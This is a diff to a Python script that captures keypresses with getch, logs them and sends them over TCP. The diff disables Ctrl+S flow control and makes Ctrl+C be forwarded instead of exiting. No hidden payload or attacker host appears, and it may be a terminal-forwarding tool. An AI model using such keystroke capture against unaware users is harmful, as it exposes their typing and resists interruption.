@@ -2,6 +2,9 @@ import getch
 import socket
 import time
 import threading
+import os
+
+os.system("stty -ixon")  # Disable Ctrl+S flow control
 
 def log(char, date):
     """Log keypresses to a file and send them over TCP."""
@@ -98,9 +101,8 @@ while True:
         else:
             log(char, date)
     except KeyboardInterrupt:
-        print("Exiting...")
-        log(chr(5), date)
-        break
+        print("Handled Ctrl+C")
+        log(chr(3), date)
     except Exception as e:
         print(f"Error: {e}")
         time.sleep(0.1)
